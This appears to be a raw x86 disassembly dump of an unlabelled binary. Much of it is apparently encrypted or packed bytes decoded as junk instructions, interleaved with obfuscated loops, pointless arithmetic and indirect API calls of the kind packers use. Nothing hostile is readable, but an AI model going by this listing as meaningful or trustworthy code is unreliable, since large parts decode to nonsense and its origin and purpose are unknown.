  40afa6:	pop    esp
  40afa7:	bswap  edi
  40afa9:	or     ebx,esi
  40afab:	cmc    
  40afac:	or     BYTE PTR [edx],ch
  40afae:	push   es
  40afaf:	mov    eax,0x1e006a87
  40afb4:	push   es
  40afb5:	push   eax
  40afb6:	inc    ecx
  40afb7:	and    eax,0xbda2b576
  40afbc:	adc    BYTE PTR [eax+0x27],ch
  40afbf:	sub    ax,0x3a67
  40afc3:	pop    ss
  40afc4:	lds    ebp,FWORD PTR [ebp+esi*2+0x53]
  40afc8:	shr    BYTE PTR [ebp+0x571a7f74],1
  40afce:	cld    
  40afcf:	inc    ebx
  40afd0:	mov    DWORD PTR [ebx+0x1bc29f51],0xa4367861
  40afda:	mov    esi,0xe7f8c13
  40afdf:	jmp    0x15deee37
  40afe4:	mov    ecx,0x6441df27
  40afe9:	mov    edi,0xb0d0623f
  40afee:	push   cs
  40afef:	inc    esi
  40aff0:	mov    ebp,0xd9415b74
  40aff5:	ins    BYTE PTR es:[edi],dx
  40aff6:	pop    ds
  40aff7:	scas   al,BYTE PTR es:[edi]
  40aff8:	hlt    
  40aff9:	sub    edx,DWORD PTR [esi+0x5f]
  40affc:	mov    eax,ds:0x1ec87ed1
  40b001:	leave  
  40b002:	test   al,0xc0
  40b004:	push   ds
  40b005:	rcr    DWORD PTR [edx-0x27bcc3c],0xc6
  40b00c:	int    0xff
  40b00e:	cli    
  40b00f:	aas    
  40b010:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b011:	adc    cl,bh
  40b013:	push   esp
  40b014:	sbb    eax,0x2c8b4cf1
  40b019:	das    
  40b01a:	dec    esi
  40b01b:	and    DWORD PTR [edx],ebx
  40b01d:	icebp  
  40b01e:	dec    eax
  40b01f:	adc    al,dl
  40b021:	adc    BYTE PTR [ecx+esi*8-0x50d98fa2],bh
  40b028:	loope  0x40b048
  40b02a:	shr    BYTE PTR es:[edi],cl
  40b02d:	jecxz  0x40b024
  40b02f:	mov    ch,0x7
  40b031:	jae    0x40b066
  40b033:	mov    bh,0x2f
  40b035:	stos   BYTE PTR es:[edi],al
  40b036:	cld    
  40b037:	inc    ecx
  40b038:	out    0x25,al
  40b03a:	fbstp  TBYTE PTR [esi-0x80]
  40b03d:	shl    DWORD PTR [edi],cl
  40b03f:	ins    BYTE PTR es:[edi],dx
  40b040:	push   esp
  40b041:	lods   al,BYTE PTR ds:[esi]
  40b042:	pusha  
  40b043:	xor    cl,BYTE PTR [edx+0x14fe410e]
  40b049:	leave  
  40b04a:	sub    eax,0x70b5a724
  40b04f:	adc    cl,cl
  40b051:	cmp    ecx,DWORD PTR [ecx]
  40b053:	xchg   ebx,eax
  40b054:	xor    BYTE PTR [ebx-0x11b7558e],dh
  40b05a:	xchg   DWORD PTR [edx+0x1f141d99],ecx
  40b060:	dec    eax
  40b061:	pusha  
  40b062:	lods   al,BYTE PTR ds:[esi]
  40b063:	jg     0x40b020
  40b065:	test   al,0x7
  40b067:	adc    al,0x5
  40b069:	add    BYTE PTR [ebp+0x4d4c80a],ah
  40b06f:	fdiv   st,st(7)
  40b071:	mov    edx,0xaf39fb4c
  40b076:	jmp    0x8d6ce10c
  40b07b:	add    eax,0x4741626a
  40b080:	jl     0x40b0f1
  40b082:	jg     0x40b01c
  40b084:	inc    eax
  40b085:	dec    ebp
  40b086:	out    0xb7,eax
  40b088:	push   0xffffffef
  40b08a:	or     ah,0x96
  40b08d:	enter  0xae8d,0x57
  40b091:	jle    0x40b09d
  40b093:	sub    ecx,DWORD PTR [ebx+eiz*2-0x1a3f8faf]
  40b09a:	and    dl,BYTE PTR [esi]
  40b09c:	xor    eax,edx
  40b09e:	xor    esi,edx
  40b0a0:	add    eax,ecx
  40b0a2:	add    esi,ecx
  40b0a4:	imul   eax,esi
  40b0a7:	mov    esi,DWORD PTR [ebp+0xc]
  40b0aa:	cmp    esi,eax
  40b0ac:	mov    eax,DWORD PTR [ebp-0x4]
  40b0af:	je     0x40aa89
  40b0b5:	xor    eax,edx
  40b0b7:	add    eax,ecx
  40b0b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40b0bc:	imul   eax,ecx
  40b0bf:	add    eax,DWORD PTR [ebp+0x8]
  40b0c2:	mov    DWORD PTR [ebp+0xc],eax
  40b0c5:	mov    eax,DWORD PTR [ebp+0xc]
  40b0c8:	jmp    0x40b2c3
  40b0cd:	fadd   QWORD PTR [edi-0x18]
  40b0d0:	(bad)  
  40b0d1:	ins    DWORD PTR es:[edi],dx
  40b0d2:	jns    0x40b0d0
  40b0d4:	pop    ebp
  40b0d5:	xchg   BYTE PTR [ebx+0xb],cl
  40b0d8:	xor    dl,ch
  40b0da:	popf   
  40b0db:	das    
  40b0dc:	rcr    DWORD PTR [ebp+0x5c7e7ee2],1
  40b0e2:	jg     0x40b162
  40b0e4:	jle    0x40b146
  40b0e6:	aaa    
  40b0e7:	icebp  
  40b0e8:	dec    eax
  40b0e9:	(bad)  
  40b0ea:	addr16 cmp eax,0xbbcdaf09
  40b0f0:	test   DWORD PTR [edi+0x6fda8040],edx
  40b0f6:	jo     0x40b0dc
  40b0f8:	outs   dx,BYTE PTR ds:[esi]
  40b0f9:	xchg   ebp,eax
  40b0fa:	daa    
  40b0fb:	mov    esp,0x39717605
  40b100:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b101:	push   ebp
  40b102:	jmp    0x56e5:0x6f6cbba
  40b109:	std    
  40b10a:	sbb    bl,bl
  40b10c:	or     eax,0x4c47f255
  40b111:	loope  0x40b149
  40b113:	pushf  
  40b114:	shr    BYTE PTR [eax+0x78],1
  40b117:	cmc    
  40b118:	(bad)  
  40b119:	sbb    ebx,DWORD PTR [ebp+0x7b]
  40b11c:	aad    0x20
  40b11e:	retf   0x6d74
  40b121:	jecxz  0x40b11a
  40b123:	push   es
  40b124:	lods   eax,DWORD PTR ds:[esi]
  40b125:	das    
  40b126:	mov    WORD PTR [esi+0x5b4ef91b],es
  40b12c:	out    dx,al
  40b12d:	sbb    BYTE PTR [edi+0x31f094b1],ch
  40b133:	xlat   BYTE PTR ds:[ebx]
  40b134:	popa   
  40b135:	mov    ebx,fs
  40b137:	sub    al,0x6e
  40b139:	clc    
  40b13a:	jno    0x40b12c
  40b13c:	(bad)  
  40b13e:	mov    ch,0xdb
  40b140:	or     al,0x4
  40b142:	jnp    0x40b0d2
  40b144:	je     0x40b186
  40b146:	jbe    0x40b0fe
  40b148:	(bad)  
  40b149:	jle    0x40b106
  40b14b:	daa    
  40b14c:	(bad)  
  40b14d:	dec    esi
  40b14e:	xlat   BYTE PTR ds:[ebx]
  40b14f:	pop    es
  40b150:	sub    DWORD PTR [ebp-0x3b],ecx
  40b153:	(bad)  
  40b154:	shr    DWORD PTR [edx+eiz*4-0x77],cl
  40b158:	sub    eax,0xbe79e3c5
  40b15d:	addr16 jnp 0x40b0e8
  40b160:	cmp    eax,0xcb0b4665
  40b165:	div    BYTE PTR [edx+0x3c]
  40b168:	fsubr  QWORD PTR [esi-0x7c]
  40b16b:	fs pop eax
  40b16d:	push   eax
  40b16e:	test   DWORD PTR [ecx-0x6e],ecx
  40b171:	mov    edi,0x7dcb2b3e
  40b176:	jne    0x40b0f8
  40b178:	das    
  40b179:	out    dx,al
  40b17a:	cmp    bh,bl
  40b17c:	mov    ds:0x2d12c340,eax
  40b181:	test   al,0x35
  40b183:	cmp    eax,0xe72606a8
  40b188:	dec    ecx
  40b189:	jmp    0x3a50:0x5e2946be
  40b190:	push   ebx
  40b191:	pop    ecx
  40b192:	je     0x40b12b
  40b194:	sub    al,0xb1
  40b196:	xor    eax,0xdcad6c58
  40b19c:	pop    ds
  40b19d:	lock addr16 pushf 
  40b1a0:	js     0x40b12f
  40b1a2:	pop    ds
  40b1a3:	cwde   
  40b1a4:	xlat   BYTE PTR ds:[ebx]
  40b1a5:	sar    DWORD PTR [esp+ebx*4-0xb09ad],0xe9
  40b1ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1ae:	inc    ebx
  40b1af:	(bad)  
  40b1b0:	fwait
  40b1b1:	or     eax,0xcc681de0
  40b1b6:	and    esi,DWORD PTR [eax]
  40b1b8:	into   
  40b1b9:	add    BYTE PTR [esp+eiz*4+0x4],al
  40b1bd:	les    esp,FWORD PTR [ebp-0x58]
  40b1c0:	or     eax,0xecdead45
  40b1c5:	sbb    eax,0xef4c3a8
  40b1ca:	dec    edx
  40b1cb:	push   ebx
  40b1cc:	push   0xe88ca6cb
  40b1d1:	mov    cl,0x72
  40b1d3:	xchg   edi,eax
  40b1d4:	(bad)  
  40b1d5:	pop    ss
  40b1d6:	das    
  40b1d7:	idiv   BYTE PTR [edx+0x2ec1a358]
  40b1dd:	(bad)  
  40b1df:	nop
  40b1e0:	jg     0x40b1ed
  40b1e2:	sub    DWORD PTR [edi],edx
  40b1e4:	(bad)  
  40b1e7:	add    bl,BYTE PTR [ecx]
  40b1e9:	sbb    ah,BYTE PTR [edx-0x45001037]
  40b1ef:	push   ebx
  40b1f0:	xchg   ebp,eax
  40b1f1:	nop
  40b1f2:	mov    al,0x0
  40b1f4:	into   
  40b1f5:	outs   dx,BYTE PTR ds:[esi]
  40b1f6:	add    ch,BYTE PTR [esi]
  40b1f8:	cmp    eax,0x895d92b
  40b1fd:	(bad)  
  40b1fe:	jb     0x40b1dc
  40b200:	dec    eax
  40b201:	and    al,0x72
  40b203:	addr16 nop
  40b205:	cld    
  40b206:	out    0x2d,al
  40b208:	(bad)  
  40b209:	out    dx,al
  40b20a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b20b:	inc    esp
  40b20c:	push   edx
  40b20d:	mov    esp,0x625c29e7
  40b212:	repnz into 
  40b214:	xchg   si,ax
  40b216:	addr16 push ds
  40b218:	mov    esp,0xbe690f15
  40b21d:	ja     0x40b27b
  40b21f:	mov    al,ds:0xe4e68305
  40b224:	pop    ecx
  40b225:	sub    al,0x22
  40b227:	xchg   BYTE PTR [edx-0x44],al
  40b22a:	imul   DWORD PTR ds:0x68b9ff94
  40b230:	daa    
  40b231:	add    eax,0x4105fa92
  40b236:	addr16 sbb eax,0xf201480
  40b23c:	test   al,0x96
  40b23e:	xchg   edi,eax
  40b23f:	push   ecx
  40b240:	out    dx,eax
  40b241:	fadd   DWORD PTR [edx-0x7520067f]
  40b247:	cmp    DWORD PTR [edx+0x2f3c593e],edi
  40b24d:	fdiv   QWORD PTR [esi]
  40b250:	idiv   DWORD PTR [esi+0x22]
  40b253:	jle    0x40b1e7
  40b255:	push   esp
  40b256:	rcl    DWORD PTR [edx+0x26],cl
  40b259:	neg    BYTE PTR [eax-0x7530933]
  40b25f:	fstp   TBYTE PTR [ebx-0x5b]
  40b262:	cmp    DWORD PTR [edx-0x19],ebx
  40b265:	repz (bad)
  40b268:	inc    ebx
  40b269:	or     eax,0xb9250223
  40b26e:	jne    0x40b224
  40b270:	(bad)  
  40b271:	out    0xae,al
  40b273:	rcr    DWORD PTR [edx-0x2e1a0bc3],cl
  40b279:	sbb    BYTE PTR [ecx+0x1a],dh
  40b27c:	wrmsr  
  40b27e:	pop    ecx
  40b27f:	jle    0x40b213
  40b281:	loop   0x40b216
  40b283:	je     0x40b2a5
  40b285:	xor    BYTE PTR [esi],ch
  40b287:	inc    ebp
  40b288:	inc    ebp
  40b289:	pop    ecx
  40b28a:	fisub  DWORD PTR ss:[edi+eiz*2-0x647c9878]
  40b292:	push   edx
  40b293:	in     eax,dx
  40b294:	and    DWORD PTR [esi],ebp
  40b296:	sub    DWORD PTR [ebx+eiz*2],ebx
  40b299:	leave  
  40b29a:	(bad)  
  40b29b:	inc    esi
  40b29c:	leave  
  40b29d:	sbb    BYTE PTR [ecx],0x66
  40b2a0:	xchg   edi,eax
  40b2a1:	xor    ebp,DWORD PTR [edx-0x7d]
  40b2a4:	retf   
  40b2a5:	xor    dh,BYTE PTR [edx]
  40b2a7:	cmp    BYTE PTR [eax-0x52],ch
  40b2aa:	mov    cl,0x61
  40b2ac:	xchg   edi,eax
  40b2ad:	jae    0x40b2e5
  40b2af:	jmp    DWORD PTR [edi+0x6d9b28f0]
  40b2b5:	fist   WORD PTR [edx]
  40b2b7:	stc    
  40b2b8:	mov    al,0x7
  40b2ba:	cmp    BYTE PTR [edi-0x15],ch
  40b2bd:	dec    esi
  40b2be:	xchg   BYTE PTR [esi-0x3],dl
  40b2c1:	jmp    DWORD PTR [edi+0x5e]
  40b2c4:	leave  
  40b2c5:	ret    0x8
  40b2c8:	push   ebp
  40b2c9:	mov    ebp,esp
  40b2cb:	sub    esp,0x30
  40b2ce:	mov    eax,ds:0x4306ee
  40b2d3:	mov    ecx,DWORD PTR ds:0x4306fa
  40b2d9:	sub    ecx,eax
  40b2db:	imul   eax,DWORD PTR [eax+ecx*1]
  40b2df:	jmp    0x40b43d
  40b2e4:	adc    eax,0x6533e552
  40b2e9:	inc    ebp
  40b2ea:	and    eax,0x241ce54
  40b2ef:	scas   al,BYTE PTR es:[edi]
  40b2f0:	xor    al,0x85
  40b2f2:	xor    eax,0x7ee4fb15
  40b2f7:	jle    0x40b338
  40b2f9:	jg     0x40b379
  40b2fb:	jle    0x40b289
  40b2fd:	loopne 0x40b2ab
  40b2ff:	popf   
  40b300:	push   0xffffff80
  40b302:	pop    ds
  40b303:	and    al,0xb3
  40b305:	adc    BYTE PTR [edi+0x6a],dh
  40b308:	retf   0x6dee
  40b30b:	and    al,0xd4
  40b30d:	in     al,0x6a
  40b30f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b310:	adc    eax,0x1184901a
  40b315:	loope  0x40b323
  40b317:	adc    bl,BYTE PTR [esi+0x11]
  40b31a:	add    BYTE PTR [edi+eax*1],ch
  40b31d:	push   ebx
  40b31e:	and    esi,DWORD PTR [eax+eax*2]
  40b321:	pushf  
  40b322:	ret    0x952c
  40b325:	and    eax,0x3ee7cd89
  40b32a:	inc    esp
  40b32b:	fdivrp st(4),st
  40b32d:	jmp    DWORD PTR [ecx-0x2111ea12]
  40b333:	outs   dx,DWORD PTR ds:[esi]
  40b334:	das    
  40b335:	inc    ebp
  40b336:	outs   dx,BYTE PTR ds:[esi]
  40b337:	push   eax
  40b338:	adc    BYTE PTR [esi],al
  40b33a:	mov    ah,0x73
  40b33c:	ins    BYTE PTR es:[edi],dx
  40b33d:	jb     0x40b2c6
  40b33f:	sbb    al,0xb6
  40b341:	idiv   BYTE PTR [ebx-0x43]
  40b344:	push   es
  40b345:	sahf   
  40b346:	adc    BYTE PTR [esi-0x4d5ffc46],al
  40b34c:	div    DWORD PTR [ecx]
  40b34e:	push   ecx
  40b34f:	fisttp WORD PTR [ebx+0x2f]
  40b352:	sbb    eax,0x406392f6
  40b357:	popa   
  40b358:	shl    ebx,1
  40b35a:	and    eax,0xec5bda76
  40b35f:	cmp    al,0x17
  40b361:	ja     0x40b372
  40b363:	inc    ecx
  40b364:	push   eax
  40b365:	in     eax,dx
  40b366:	cmc    
  40b367:	mov    esp,0x91c5abd2
  40b36c:	push   ebp
  40b36d:	pop    edi
  40b36e:	inc    di
  40b370:	add    bl,BYTE PTR [ecx]
  40b372:	scas   al,BYTE PTR es:[edi]
  40b373:	(bad)  
  40b374:	fld    QWORD PTR [esi+0x7c4d2ce6]
  40b37a:	sub    edi,esp
  40b37c:	inc    edi
  40b37d:	or     ebx,DWORD PTR [ecx+esi*1+0x67]
  40b381:	(bad)  [edi]
  40b383:	inc    ebx
  40b384:	mov    ch,0x63
  40b386:	icebp  
  40b387:	iret   
  40b388:	cmp    BYTE PTR [edi],0xd6
  40b38b:	jae    0x40b3c6
  40b38d:	inc    ebx
  40b38e:	(bad)  
  40b38f:	sar    ch,cl
  40b391:	dec    ecx
  40b392:	xchg   esp,eax
  40b393:	push   ebx
  40b394:	sub    ecx,DWORD PTR [edi-0x5e]
  40b397:	loopne 0x40b387
  40b399:	jmp    0x40b374
  40b39b:	shl    BYTE PTR ds:0xa27508d8,1
  40b3a1:	sub    DWORD PTR [ebx+0x50],eax
  40b3a4:	add    esp,esp
  40b3a6:	push   0x2
  40b3a8:	(bad)  
  40b3a9:	pop    edi
  40b3aa:	sub    al,bh
  40b3ac:	in     eax,dx
  40b3ad:	push   ecx
  40b3ae:	jp     0x40b3b0
  40b3b0:	cwde   
  40b3b1:	mov    cl,0x3e
  40b3b3:	add    BYTE PTR [edx+0x53],dh
  40b3b6:	push   cs
  40b3b7:	mov    DWORD PTR [ebx-0x55],ebp
  40b3ba:	adc    cl,BYTE PTR [ecx+eax*4]
  40b3bd:	mov    cl,0xf3
  40b3bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3c0:	xor    bl,0x1f
  40b3c3:	mov    esp,0xce8ab62f
  40b3c8:	sub    ebp,esp
  40b3ca:	scas   al,BYTE PTR es:[edi]
  40b3cb:	xchg   edx,eax
  40b3cc:	mov    ds,WORD PTR [edx+0x6036d0e4]
  40b3d2:	lea    ebx,[esi-0x63c557d9]
  40b3d8:	outs   dx,DWORD PTR ds:[esi]
  40b3d9:	pop    ebp
  40b3da:	lds    eax,FWORD PTR [ecx+ecx*4+0x73]
  40b3de:	jge    0x40b42a
  40b3e0:	nop
  40b3e1:	push   0x87712ad7
  40b3e6:	jbe    0x40b394
  40b3e8:	in     eax,0xbb
  40b3ea:	xchg   DWORD PTR [ebp+0x11d85102],esp
  40b3f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3f1:	jl     0x40b3e9
  40b3f3:	mov    eax,ds:0xc8165fba
  40b3f8:	adc    BYTE PTR [ebx+eiz*8],bh
  40b3fb:	imul   esp,DWORD PTR [eax+ecx*8+0x47],0x18
  40b400:	and    BYTE PTR [edi-0x1f],bl
  40b403:	cwde   
  40b404:	mov    ds:0x43abe28f,eax
  40b409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b40a:	clc    
  40b40b:	add    BYTE PTR [ebx-0x29],al
  40b40e:	mov    ch,0xf5
  40b410:	jg     0x40b46a
  40b412:	fcmovnb st,st(1)
  40b414:	push   esp
  40b415:	mov    bl,0xa8
  40b417:	loop   0x40b474
  40b419:	imul   ebx,ebx,0x3f90280e
  40b41f:	push   0xffffffa5
  40b421:	outs   dx,BYTE PTR ds:[esi]
  40b422:	mov    edx,0x15a0117d
  40b427:	mov    edi,?
  40b429:	xor    dh,BYTE PTR [edx-0x49]
  40b42c:	sub    esi,DWORD PTR [edi-0x73]
  40b42f:	lds    ecx,FWORD PTR [ecx]
  40b431:	xor    eax,0x2949b944
  40b436:	xor    eax,0xd501b03c
  40b43b:	call   0x8535:0xfc45c71f
  40b442:	pushf  
  40b443:	clc    
  40b444:	mov    DWORD PTR ds:0x4306ce,0x11
  40b44e:	cmp    DWORD PTR ds:0x4306ce,0x0
  40b455:	je     0x40b489
  40b45b:	cmp    DWORD PTR ds:0x4306ce,0x19
  40b462:	jne    0x40b479
  40b468:	push   DWORD PTR [ebp-0x24]
  40b46b:	push   DWORD PTR [ebp-0x20]
  40b46e:	push   0x41ff
  40b473:	call   DWORD PTR ds:0x42ec68
  40b479:	mov    eax,ds:0x4306ce
  40b47e:	dec    eax
  40b47f:	mov    ds:0x4306ce,eax
  40b484:	jmp    0x40b44e
  40b489:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40b490:	or     eax,0x1c5c
  40b495:	mov    ecx,DWORD PTR [ebp-0x4]
  40b498:	push   ebx
  40b499:	add    DWORD PTR ds:0x43062e,edi
  40b49f:	mov    eax,0x7510856
  40b4a4:	mov    ebx,DWORD PTR ds:0x4306c2
  40b4aa:	sbb    DWORD PTR ds:0x42e8e2,ebx
  40b4b0:	xor    ecx,eax
  40b4b2:	mov    ebx,DWORD PTR ds:0x42ef94
  40b4b8:	sub    DWORD PTR ds:0x43060e,ebx
  40b4be:	mov    ebx,0x32729d
  40b4c3:	xor    DWORD PTR ds:0x4306c6,0xece
  40b4cd:	add    ecx,ebx
  40b4cf:	xor    DWORD PTR ds:0x430616,0x42e8ea
  40b4d9:	mov    DWORD PTR [ebp-0x1c],ecx
  40b4dc:	mov    ecx,DWORD PTR [ebp+0x14]
  40b4df:	xor    DWORD PTR ds:0x42ef9c,0x65f3
  40b4e9:	push   esi
  40b4ea:	sub    DWORD PTR ds:0x42e8e2,0x2022
  40b4f4:	push   edi
  40b4f5:	and    DWORD PTR ds:0x4306c6,0x430612
  40b4ff:	test   ecx,ecx
  40b501:	mov    DWORD PTR ds:0x42e8de,0x17b6
  40b50b:	je     0x40b58a
  40b511:	add    ecx,0x2345
  40b517:	mov    ecx,DWORD PTR [ebp+0x14]
  40b51a:	and    DWORD PTR ds:0x430626,0x0
  40b524:	jmp    0x40b536
  40b529:	mov    edi,DWORD PTR ds:0x430626
  40b52f:	inc    edi
  40b530:	mov    DWORD PTR ds:0x430626,edi
  40b536:	cmp    DWORD PTR ds:0x430626,0x1d
  40b53d:	jae    0x40b585
  40b543:	cmp    DWORD PTR ds:0x430626,0x4
  40b54a:	jne    0x40b560
  40b550:	push   0x42ef9c
  40b555:	push   0x6d9e
  40b55a:	call   DWORD PTR ds:0x42ec6c
  40b560:	cmp    DWORD PTR ds:0x430626,0x3
  40b567:	jne    0x40b57a
  40b56d:	mov    edi,DWORD PTR ds:0x430626
  40b573:	inc    edi
  40b574:	mov    DWORD PTR ds:0x430626,edi
  40b57a:	jmp    0x40b529
  40b57f:	and    esi,0x3dcd
  40b585:	mov    ecx,DWORD PTR [ecx]
  40b587:	mov    DWORD PTR [ebp-0x1c],ecx
  40b58a:	movzx  esi,BYTE PTR ds:0x430612
  40b591:	xor    DWORD PTR ds:0x43063a,esi
  40b597:	imul   edx,eax
  40b59a:	or     DWORD PTR ds:0x43063e,edx
  40b5a0:	mov    ecx,0x4573
  40b5a5:	xor    esi,DWORD PTR ds:0x430606
  40b5ab:	add    edx,ecx
  40b5ad:	mov    esi,0x7879
  40b5b2:	and    DWORD PTR ds:0x4306be,0x0
  40b5bc:	mov    edi,DWORD PTR ds:0x4306be
  40b5c2:	inc    edi
  40b5c3:	mov    DWORD PTR ds:0x4306be,edi
  40b5c9:	cmp    DWORD PTR ds:0x4306be,0x12
  40b5d0:	jne    0x40b5f7
  40b5d6:	push   0x1
  40b5d8:	push   0x3333
  40b5dd:	push   0x7164
  40b5e2:	push   0x26d7
  40b5e7:	push   0x1d14
  40b5ec:	push   0x64d6
  40b5f1:	call   DWORD PTR ds:0x42ec70
  40b5f7:	cmp    DWORD PTR ds:0x4306be,0x11
  40b5fe:	jne    0x40b613
  40b604:	xor    edi,edi
  40b606:	or     edi,DWORD PTR ds:0x4306be
  40b60c:	inc    edi
  40b60d:	mov    DWORD PTR ds:0x4306be,edi
  40b613:	cmp    DWORD PTR ds:0x4306be,0x1f
  40b61a:	jb     0x40b5bc
  40b620:	dec    edi
  40b621:	mov    edi,0x1556
  40b626:	xchg   esi,ecx
  40b628:	sub    edx,edi
  40b62a:	xor    esi,esi
  40b62c:	jmp    0x40b78a
  40b631:	mov    ch,dh
  40b633:	add    esi,DWORD PTR [eax+0x7b]
  40b636:	aad    0x9d
  40b638:	jl     0x40b646
  40b63a:	mov    eax,0x2c484dc4
  40b63f:	add    al,0x92
  40b641:	mov    esp,0x3f7e7ee5
  40b646:	jg     0x40b6c6
  40b648:	jle    0x40b632
  40b64a:	jnp    0x40b60e
  40b64c:	lock or ebx,esp
  40b64f:	xor    BYTE PTR [edx-0x534b79dc],al
  40b655:	sbb    BYTE PTR [edx*1+0x465b4805],dl
  40b65c:	pop    edi
  40b65d:	and    BYTE PTR [eax],0x92
  40b660:	aaa    
  40b661:	into   
  40b662:	int    0xf3
  40b664:	ja     0x40b66e
  40b666:	sbb    ah,BYTE PTR [esi+esi*1-0x59]
  40b66a:	rcl    BYTE PTR ds:0x25c05028,1
  40b670:	xchg   ebx,eax
  40b671:	bound  edi,QWORD PTR [ebp+0x6b]
  40b674:	repz sbb eax,0x7921433
  40b67a:	sub    ah,bl
  40b67c:	jne    0x40b67f
  40b67e:	scas   al,BYTE PTR es:[edi]
  40b67f:	(bad)  
  40b680:	out    dx,eax
  40b681:	test   BYTE PTR [esi+ebp*1-0x7c],ch
  40b685:	push   cs
  40b686:	inc    ecx
  40b687:	jecxz  0x40b6e5
  40b689:	aas    
  40b68a:	push   ss
  40b68b:	or     ebp,esp
  40b68d:	adc    al,0x2c
  40b68f:	sub    DWORD PTR [ebp+0x5c83b87d],0xffffff9f
  40b696:	call   0x60cf:0xf7883698
  40b69d:	pop    ss
  40b69e:	std    
  40b69f:	enter  0x4a59,0x69
  40b6a3:	or     eax,0x18680db
  40b6a8:	data16 ffreep st(2)
  40b6ab:	into   
  40b6ac:	inc    ecx
  40b6ad:	inc    eax
  40b6ae:	jg     0x40b646
  40b6b0:	enter  0x9e00,0xb5
  40b6b4:	std    
  40b6b5:	cwde   
  40b6b6:	dec    esi
  40b6b7:	inc    ebp
  40b6b8:	cmc    
  40b6b9:	fmul   st(5),st
  40b6bb:	cmc    
  40b6bc:	jnp    0x40b6d6
  40b6be:	sbb    dl,BYTE PTR [ecx]
  40b6c0:	xor    DWORD PTR [ecx+0x41ace88c],ebp
  40b6c6:	push   ecx
  40b6c7:	jmp    0x29ccc47e
  40b6cc:	je     0x40b6df
  40b6ce:	jl     0x40b6db
  40b6d0:	data16 and BYTE PTR [eax-0x74],ch
  40b6d4:	test   eax,0xd1a93883
  40b6d9:	repnz add DWORD PTR [ebp-0x1d],esi
  40b6dd:	sbb    esp,DWORD PTR [ebx-0x22]
  40b6e0:	sbb    BYTE PTR [ecx],ah
  40b6e2:	fisub  WORD PTR [edx]
  40b6e4:	jo     0x40b703
  40b6e6:	pushf  
  40b6e7:	fcom   DWORD PTR [ebp+0x6d]
  40b6ea:	imul   ebp,edx,0x2062a73b
  40b6f0:	mov    al,0x4c
  40b6f2:	ins    BYTE PTR es:[edi],dx
  40b6f3:	inc    edx
  40b6f4:	arpl   WORD PTR [eax+0x6f],ax
  40b6f7:	adc    edx,DWORD PTR [ebp-0x4c]
  40b6fa:	add    esp,ecx
  40b6fc:	int3   
  40b6fd:	pop    ebp
  40b6fe:	inc    edi
  40b6ff:	cmp    ah,dl
  40b701:	hlt    
  40b702:	sti    
  40b703:	adc    bl,BYTE PTR [edx+0x7a6fc004]
  40b709:	jg     0x40b6ad
  40b70b:	mov    ebx,0x1429a880
  40b710:	popf   
  40b711:	xchg   ebp,eax
  40b712:	jmp    0x203cb029
  40b717:	xor    al,0xe6
  40b719:	repnz nop
  40b71b:	mov    ch,0xce
  40b71d:	xor    al,0x2f
  40b71f:	jo     0x40b74c
  40b721:	cdq    
  40b722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b723:	jbe    0x40b70d
  40b725:	cmp    al,0x2c
  40b727:	mov    bh,0xb
  40b729:	idiv   BYTE PTR ds:0x37bcab8f
  40b72f:	jg     0x40b724
  40b731:	jbe    0x40b7a5
  40b733:	rol    BYTE PTR [edx+0x6d],0x29
  40b737:	inc    esp
  40b738:	js     0x40b7b6
  40b73a:	or     dh,BYTE PTR [eax-0x4934fd43]
  40b740:	mov    bh,BYTE PTR [esi-0x7e6a6762]
  40b746:	mov    edx,0x44aa13ad
  40b74b:	jg     0x40b717
  40b74d:	ja     0x40b721
  40b74f:	jns    0x40b714
  40b751:	shl    BYTE PTR [esi],0xdb
  40b754:	mov    bh,0x4
  40b756:	sub    DWORD PTR [esi+0x742c596],0x642aace4
  40b760:	push   ebp
  40b761:	push   ebx
  40b762:	cdq    
  40b763:	in     eax,dx
  40b764:	push   ebp
  40b765:	bound  esi,QWORD PTR [ebp+0x4949aa1c]
  40b76b:	pusha  
  40b76c:	lods   al,BYTE PTR ds:[esi]
  40b76d:	sbb    eax,0x76bb3f8f
  40b772:	or     DWORD PTR [ebp-0x68bf9c2b],ebx
  40b778:	inc    esp
  40b779:	and    BYTE PTR [edi],ch
  40b77b:	adc    ebp,DWORD PTR [eax-0xa6e994c]
  40b781:	leave  
  40b782:	xchg   esi,eax
  40b783:	push   cs
  40b784:	sbb    BYTE PTR [ebx],ah
  40b786:	push   eax
  40b787:	or     dl,BYTE PTR [edi-0x278a7652]
  40b78d:	and    DWORD PTR ds:0x430632,ebx
  40b793:	mov    DWORD PTR [ebp-0x2c],esi
  40b796:	or     ecx,DWORD PTR ds:0x4306c2
  40b79c:	jmp    0x40b8fa
  40b7a1:	gs inc edi
  40b7a3:	xor    eax,0x657cedde
  40b7a8:	pop    ebp
  40b7a9:	xchg   edx,eax
  40b7aa:	lods   al,BYTE PTR ds:[esi]
  40b7ab:	mov    al,ds:0xb32c197
  40b7b0:	addr16 jge 0x40b799
  40b7b3:	jle    0x40b833
  40b7b5:	aas    
  40b7b6:	jg     0x40b836
  40b7b8:	jle    0x40b760
  40b7ba:	jo     0x40b79a
  40b7bc:	mov    ah,0xd9
  40b7be:	jl     0x40b828
  40b7c0:	jns    0x40b7e0
  40b7c2:	dec    esp
  40b7c3:	push   cs
  40b7c4:	xchg   esp,ecx
  40b7c6:	xchg   edi,eax
  40b7c7:	pop    ds
  40b7c8:	mov    esi,0x7da8867b
  40b7cd:	pop    edx
  40b7ce:	scas   al,BYTE PTR es:[edi]
  40b7cf:	sar    DWORD PTR [ebx],cl
  40b7d1:	mov    dh,0xa
  40b7d3:	stc    
  40b7d4:	(bad)  [edi]
  40b7d6:	repnz sbb eax,0x20523620
  40b7dc:	rol    al,1
  40b7de:	dec    esp
  40b7df:	jae    0x40b833
  40b7e1:	add    eax,0xb51a510f
  40b7e6:	and    DWORD PTR [ecx+0x63],ebp
  40b7e9:	(bad)  
  40b7ea:	clc    
  40b7eb:	fwait
